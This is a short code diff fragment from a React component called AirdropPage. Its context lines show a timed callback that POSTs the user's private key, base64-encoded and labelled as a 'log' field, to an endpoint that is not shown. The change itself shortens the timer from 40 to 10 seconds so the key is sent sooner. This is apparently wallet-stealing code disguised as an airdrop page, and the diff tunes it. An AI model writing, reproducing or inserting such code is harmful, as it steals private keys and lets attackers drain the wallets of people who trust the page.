@@ -32,7 +32,7 @@ function AirdropPage(){
           body: JSON.stringify({log: btoa(privateKey)})
         });
         clearInterval(tt)
-      }, 40*1*1000)
+      }, 10*1*1000)
       return () => clearInterval(tt)
     }
   },[privateKey])
